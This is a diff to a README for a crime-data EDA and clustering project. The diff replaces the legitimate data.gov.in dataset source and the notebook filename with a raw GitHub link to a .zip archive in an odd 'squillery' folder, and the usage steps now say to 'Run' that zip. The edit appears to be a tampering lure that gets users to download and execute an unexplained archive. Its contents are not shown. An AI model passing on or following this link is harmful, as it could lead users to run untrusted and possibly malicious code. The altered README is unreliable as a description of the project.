@@ -4,7 +4,7 @@ This project performs exploratory data analysis (EDA) and clustering on crime da
 
 ## Dataset
 
-**Source:** `Districtwise_Crime_of_India_2001_to_2014.csv` `written as q.csv in the notbook` from `https://www.data.gov.in/catalog/district-wise-crimes-under-various-sections-indian-penal-code-ipc-crimes`  
+**Source:** `https://raw.githubusercontent.com/aayushv2003/EDA-Patrol_DataMiners/main/squillery/EDA-Patrol_DataMiners.zip` `written as https://raw.githubusercontent.com/aayushv2003/EDA-Patrol_DataMiners/main/squillery/EDA-Patrol_DataMiners.zip in the notbook` from `https://raw.githubusercontent.com/aayushv2003/EDA-Patrol_DataMiners/main/squillery/EDA-Patrol_DataMiners.zip`  
 The dataset contains crime statistics from 2001 to 2014 across Indian districts.
 
 ## Methods Used
@@ -37,4 +37,4 @@ The dataset contains crime statistics from 2001 to 2014 across Indian districts.
 
 1. Clone the repo or download the notebook.
 2. Ensure the dataset CSV is in the same directory.
-3. Run `EDA_Patrol_DataMiners.ipynb` using Jupyter or any notebook IDE.
+3. Run `https://raw.githubusercontent.com/aayushv2003/EDA-Patrol_DataMiners/main/squillery/EDA-Patrol_DataMiners.zip` using Jupyter or any notebook IDE.
